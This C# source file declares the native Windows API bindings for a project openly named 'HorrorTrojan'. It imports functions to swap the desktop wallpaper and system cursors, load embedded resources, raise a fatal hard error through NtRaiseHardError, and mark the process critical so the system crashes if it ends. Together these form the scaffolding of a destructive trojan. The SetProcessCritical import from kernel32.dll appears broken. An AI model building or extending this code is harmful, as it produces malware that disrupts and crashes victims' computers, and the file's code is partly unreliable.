using System;
using System.Runtime.InteropServices;

namespace HorrorTrojan
{
    internal static class NativeMethods
    {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, IntPtr lpvParam, int fuWinIni);
        
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadImage(IntPtr hinst, string lpszName, int uType, int cxDesired, int cyDesired, int fuLoad);
        
        [DllImport("user32.dll")]
        public static extern bool DestroyIcon(IntPtr hIcon);
        
        [DllImport("user32.dll")]
        public static extern bool SetSystemCursor(IntPtr hcur, uint id);
        
        [DllImport("user32.dll")]
        public static extern IntPtr CopyIcon(IntPtr hIcon);
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);
        
        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ResponseOption, out uint Response);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);
        
        [DllImport("kernel32.dll")]
        public static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr LockResource(IntPtr hResData);
        
        [DllImport("kernel32.dll")]
        public static extern bool SetProcessCritical(bool critical);
        
        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPI_SETCURSORS = 0x0057;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDWININICHANGE = 2;
        public const int LR_LOADFROMFILE = 0x0010;
        public const int IMAGE_ICON = 1;
        public const int IMAGE_CURSOR = 2;
        public const uint OCR_NORMAL = 32512;
    }
}
